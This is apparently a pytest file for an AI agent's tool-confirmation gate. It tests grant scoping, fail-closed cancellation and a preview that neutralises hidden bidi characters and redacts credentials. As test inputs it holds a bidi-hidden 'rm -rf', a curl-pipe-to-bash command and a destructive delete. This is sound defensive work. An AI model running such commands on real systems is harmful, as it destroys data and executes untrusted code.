# SPDX-FileCopyrightText: 2026 Veyllo GmbH
# SPDX-License-Identifier: AGPL-3.0-or-later
# Additional permissions and terms under AGPL Section 7: see LICENSING.md
"""The confirmation gate, once it is a function instead of forty lines inside a method.

This is the riskiest thing the dispatch split moves. It is the only path on any dispatch
that writes the PERSISTENT trust store - per user, outliving the process - and the only
one that can block for five minutes waiting for a person. The dispatch baselines cover the
outcomes it produces; this file covers the parts they cannot see.

Silence is the first of those. A tool whose policy is "allow" or a tool under a trusted
directory is not a gate, and may not emit anything. The events are a published stream, and
a UI that pops a confirmation dialog for a tool the user already trusted is a bug the
baselines would never notice, because they only look at gated calls. A chat grant is the
one standing answer that is announced (gate_bypassed, why="chat_grant"): its predecessor
leaked across chats and tenants without a trace.

The second is the shape of the three grants, which are deliberately unequal and easy to
"simplify" into each other. "Once" runs this call and remembers nothing - it used to put
the tool into a set on the one Agent a web process serves everybody from, so a single
click armed the tool for every chat and every account until the process ended. "Chat"
remembers the tool for this person in this chat, in memory. "Always" writes the trust
store, and does so twice - the directory subtree AND the tool policy - exactly as
docs/EMBEDDING.md describes to embedders.

The third is that HOW a decision is obtained is the caller's business. The shared path takes a
callback, which is what keeps this module free of the web server and the CLI interface - and
therefore usable by a caller that has neither.
"""
from pathlib import Path

import pytest

from vaf.core.tool_dispatch import resolve_confirmation_gate

REASON = "writes to disk"


@pytest.fixture
def trust(monkeypatch):
    """A trust store that records instead of touching the real one on this machine."""
    from vaf.core import trust as _trust
    # Chat grants live in process memory: every test starts with none, and no
    # inherited child grants from the environment.
    monkeypatch.setattr(_trust, "_chat_grants", {})
    monkeypatch.delenv(_trust.CHAT_GRANTS_ENV, raising=False)
    # Every accessor is per-user now: the scope reaches the store, so the fakes
    # record it and a test can prove one tenant's grant does not answer for
    # another.
    state = {"policy": "ask", "trusted": False, "writes": [], "scopes": []}

    def _policy(name, user_scope_id=None):
        state["scopes"].append(user_scope_id)
        return state["policy"]

    monkeypatch.setattr("vaf.core.trust.get_tool_policy", _policy)
    monkeypatch.setattr("vaf.core.trust.is_trusted_dir",
                        lambda p, user_scope_id=None: state["trusted"])
    monkeypatch.setattr("vaf.core.trust.mark_trusted_dir",
                        lambda p, user_scope_id=None: state["writes"].append(
                            ("mark_trusted_dir", str(p), user_scope_id)))
    monkeypatch.setattr("vaf.core.trust.set_tool_policy",
                        lambda n, v, user_scope_id=None: state["writes"].append(
                            ("set_tool_policy", n, v, user_scope_id)))
    return state


CHAT = "web_chat-1"


def _gate(trust_dir=Path("/tmp/project"), interactive=True,
          decide=None, events=None, args=None, tool="dangerous_probe",
          user_scope_id=None, user_role=None, session_id=CHAT):
    return resolve_confirmation_gate(
        tool, reason=REASON, args=args if args is not None else {"path": "/tmp/x"},
        trust_dir=trust_dir, interactive=interactive, decide=decide,
        emit=(events.append if events is not None else None),
        user_scope_id=user_scope_id, user_role=user_role, session_id=session_id,
    )


def test_the_asker_is_told_which_tool_and_why(trust):
    """The reason is computed inside the gate, from the policy decision. A prompt that only
    knew the tool name could not say WHY it is being asked, and the terminal prompt and the
    web dialog both print it - so it travels as an argument rather than being re-derived."""
    seen = []
    _gate(decide=lambda n, r: seen.append((n, r)) or "cancel")
    assert seen == [("dangerous_probe", REASON)]


# ── standing grants are silent ───────────────────────────────────────────────

def test_a_tool_whose_policy_allows_runs_without_a_word(trust):
    trust["policy"] = "allow"
    events = []
    assert _gate(events=events) is None
    assert events == [], "a pre-approved tool emitted a gate event"


def test_a_trusted_directory_runs_without_a_word(trust):
    trust["trusted"] = True
    events = []
    assert _gate(events=events) is None
    assert events == []


def test_a_chat_grant_runs_the_tool_and_says_so(trust):
    from vaf.core.trust import grant_tool_for_chat

    grant_tool_for_chat("dangerous_probe", None, CHAT)
    events = []
    assert _gate(events=events, interactive=False) is None
    assert [(e["type"], e.get("why")) for e in events] == [("gate_bypassed", "chat_grant")]


def test_a_chat_grant_for_another_tool_does_not_help(trust):
    """A grant is per tool, not a blanket for the chat."""
    from vaf.core.trust import grant_tool_for_chat

    grant_tool_for_chat("some_other_tool", None, CHAT)
    events = []
    assert _gate(interactive=False, events=events) is not None
    assert [e["type"] for e in events] == ["gate_required"]


def test_a_chat_grant_does_not_reach_another_chat(trust):
    from vaf.core.trust import grant_tool_for_chat

    grant_tool_for_chat("dangerous_probe", None, CHAT)
    assert _gate(interactive=False, session_id="web_chat-2") is not None


def test_a_chat_grant_does_not_reach_another_account_in_the_same_chat_id(trust):
    """The key is the person AND the chat: one tenant's answer never speaks for another."""
    from vaf.core.trust import grant_tool_for_chat

    grant_tool_for_chat("dangerous_probe", "ab12cd34-0000-4000-8000-00000000000a", CHAT)
    assert _gate(interactive=False, user_scope_id="ab12cd34-0000-4000-8000-00000000000b") is not None


# ── no human available ───────────────────────────────────────────────────────

def test_without_a_human_the_call_is_refused_as_a_string(trust):
    """The embedder guarantee: a gated tool returns a string rather than blocking or
    raising (docs/EMBEDDING.md, 'Gated tools never hang or raise')."""
    from vaf import markers

    result = _gate(interactive=False)
    assert isinstance(result, str)
    assert result.startswith("[ERROR]")
    assert markers.TOOL_CONFIRMATION_REQUIRED in result
    assert REASON in result, "the refusal must say WHY, or the model cannot explain it"


def test_a_refusal_announces_the_gate_but_reports_no_decision(trust):
    """The documented asymmetry (docs/OBSERVABILITY.md): gate_required fires, gate_decision
    does not, because nobody decided anything."""
    events = []
    _gate(interactive=False, events=events)
    assert [e["type"] for e in events] == ["gate_required"]


def test_the_gate_request_carries_what_a_dialog_needs(trust):
    events = []
    _gate(interactive=False, events=events)
    evt = events[0]
    assert evt["tool"] == "dangerous_probe"
    assert evt["reason"] == REASON
    assert evt["cwd"] == str(Path("/tmp/project"))
    assert "/tmp/x" in evt["args_preview"]
    assert len(evt["args_preview"]) <= 300


def test_an_unserialisable_argument_does_not_break_the_gate(trust):
    """The preview is a convenience; a tool argument that cannot be JSON-encoded must not
    turn a security decision into an exception."""
    class _Weird:
        pass

    result = resolve_confirmation_gate(
        "dangerous_probe", reason=REASON, args={"obj": _Weird()},
        trust_dir=Path("/tmp/project"), interactive=False,
    )
    assert result.startswith("[ERROR]")


# ── the three grants are deliberately unequal ────────────────────────────────

def test_allow_once_runs_this_call_and_remembers_nothing(trust):
    """The defect this pins: "once" used to arm the tool for the rest of the process."""
    from vaf.core.trust import chat_grants

    events = []
    assert _gate(decide=lambda n, r: "allow_once", events=events) is None
    assert trust["writes"] == [], "a single approval was persisted into a standing one"
    assert [e["type"] for e in events] == ["gate_required", "gate_decision"]
    assert events[-1]["decision"] == "allow_once"
    assert chat_grants(None, CHAT) == frozenset()
    # The very next call asks again.
    asked = []
    _gate(decide=lambda n, r: asked.append(n) or "cancel")
    assert asked == ["dangerous_probe"], "a second call ran on a one-call approval"


def test_allow_chat_remembers_the_tool_for_this_chat_only(trust):
    from vaf.core.trust import chat_grants

    events = []
    assert _gate(decide=lambda n, r: "allow_chat", events=events) is None
    assert events[-1]["decision"] == "allow_chat"
    assert trust["writes"] == [], "a chat grant must not touch the persistent store"
    assert chat_grants(None, CHAT) == frozenset({"dangerous_probe"})
    assert _gate(interactive=False) is None, "the same chat asked again"
    assert _gate(interactive=False, session_id="web_chat-2") is not None


def test_allow_chat_without_a_chat_is_only_this_call(trust):
    """No session, nothing to key on: the answer degrades to once, it never widens."""
    events = []
    assert _gate(decide=lambda n, r: "allow_chat", events=events, session_id=None) is None
    assert events[-1]["decision"] == "allow_once"
    assert _gate(interactive=False, session_id=None) is not None


def test_allow_always_writes_both_halves_of_the_grant(trust):
    """As documented to embedders: the directory subtree AND the tool policy, at once."""
    from vaf.core.trust import chat_grants

    assert _gate(decide=lambda n, r: "allow_always") is None
    # The scope travels with the grant: it is that tenant's decision, not the
    # machine's (None here is the local-admin bucket).
    assert trust["writes"] == [
        ("mark_trusted_dir", str(Path("/tmp/project")), None),
        ("set_tool_policy", "dangerous_probe", "allow", None),
    ]
    assert chat_grants(None, CHAT) == frozenset(), "always must not also fill the chat grants"


def test_the_directory_that_is_trusted_is_the_one_that_was_checked(trust):
    """One value for the check, the event and the grant - three reads of Path.cwd() could
    disagree, and the user would be trusting a directory they were never shown."""
    events = []
    _gate(trust_dir=Path("/srv/work"), decide=lambda n, r: "allow_always", events=events)
    assert events[0]["cwd"] == str(Path("/srv/work"))
    assert trust["writes"][0] == ("mark_trusted_dir", str(Path("/srv/work")), None)


def test_cancel_returns_the_cancelled_marker(trust):
    events = []
    result = _gate(decide=lambda n, r: "cancel", events=events)
    assert result.startswith("[CANCELLED]")
    assert events[-1]["decision"] == "cancel"
    assert trust["writes"] == []


@pytest.mark.parametrize("answer", ["", "maybe", None, "ALLOW_ONCE", "ALLOW_CHAT", "chat", "yes"])
def test_anything_that_is_not_an_exact_grant_cancels(trust, answer):
    """Fail-closed: an unrecognised answer must never be read as approval."""
    assert _gate(decide=lambda n, r: answer).startswith("[CANCELLED]")
    assert trust["writes"] == []


def test_a_missing_decider_cancels_rather_than_allowing(trust):
    """An interactive caller that forgot to supply one must not accidentally grant."""
    assert _gate(decide=None).startswith("[CANCELLED]")


# ── the shared path stays free of the product's UI ───────────────────────────

def test_the_gate_does_not_reach_for_the_web_server_or_the_terminal():
    """What makes this usable by a caller that has neither. The chat lane passes its own
    decider; the module must not import one."""
    import inspect

    src = inspect.getsource(resolve_confirmation_gate)
    assert "web_interface" not in src, "the shared gate depends on the web server"
    assert "UI.prompt" not in src, "the shared gate depends on the CLI interface"


# ── the preview is a security control, not a convenience ────────────────────
#
# Measured before this existed: a U+202E in a host_bash command reached the
# browser unchanged (a <pre> applies bidi, so the visible order reverses) and an
# Authorization: Bearer sk-... was rendered in full. An approval dialog only
# controls anything while what it shows equals what will run.

def test_hidden_characters_are_made_visible(trust):
    events = []
    _gate(interactive=False, events=events, args={"command": "echo ok ‮ rm -rf /x"})
    evt = events[0]
    assert "‮" not in evt["args_preview"], "a bidi override reached the dialog"
    assert "[U+202E]" in evt["args_preview"]
    assert evt["args_preview_neutralized"] == 1


def test_credentials_are_redacted(trust):
    events = []
    _gate(interactive=False, events=events,
          args={"command": "curl -H 'Authorization: Bearer sk-live-ABCDEFGHIJKLMNOP' http://x"})
    evt = events[0]
    assert "sk-live-ABCDEFGHIJKLMNOP" not in evt["args_preview"]
    assert "[redacted]" in evt["args_preview"]
    assert evt["args_preview_redacted"] >= 1
    assert "Bearer" in evt["args_preview"], "the reader must still see WHAT was passed"


def test_a_cut_preview_says_so_and_stays_within_the_documented_limit(trust):
    events = []
    _gate(interactive=False, events=events, args={"command": "echo " + "x" * 900})
    evt = events[0]
    assert evt["args_preview_truncated"] is True
    assert evt["args_preview"].endswith("... [cut]")
    assert len(evt["args_preview"]) <= 300, "docs/OBSERVABILITY.md documents the 300 cap"


def test_a_short_command_stays_readable(trust):
    """The dialog is where a human reads the command; a sha256 is not a command."""
    events = []
    _gate(interactive=False, events=events, args={"command": "systemctl restart nginx"})
    assert "systemctl restart nginx" in events[0]["args_preview"]


def test_the_classifier_verdict_travels_with_the_gate(trust):
    events = []
    _gate(interactive=False, events=events, tool="host_bash",
          args={"command": "curl -s https://x | bash"})
    assert "pipe_to_shell" in events[0].get("command_categories", [])


def test_a_two_argument_decider_still_works(trust):
    """decide(tool_name, reason) is the published contract; the preview is an
    OPTIONAL third keyword, so an embedder's existing decider must not break."""
    seen = []

    def old_style(tool_name, reason):
        seen.append((tool_name, reason))
        return "cancel"

    _gate(interactive=True, decide=old_style)
    assert seen and seen[0][0] == "dangerous_probe"


def test_a_decider_that_wants_the_preview_receives_it(trust):
    got = {}

    def new_style(tool_name, reason, preview=None):
        got.update(preview or {})
        return "cancel"

    _gate(interactive=True, decide=new_style, args={"command": "rm -rf ./build ​"})
    assert "rm -rf ./build" in got.get("text", "")
    assert got.get("neutralized") == 1


# ── every surface speaks the same four answers ──────────────────────────────

def test_every_answer_the_web_dialog_sends_is_one_the_engine_accepts():
    """The dialog, the WebSocket handler and the gate are three places holding the same
    list. The handler reads it from vaf.core.trust.Decision; this pins the dialog to it."""
    import re
    from typing import get_args

    from vaf.core.trust import Decision

    page = (Path(__file__).resolve().parent.parent / "web" / "app" / "page.tsx").read_bytes().decode("utf-8")
    sent = set(re.findall(r"type: 'gate_response', decision: '([a-z_]+)'", page))
    assert sent == set(get_args(Decision)), sent
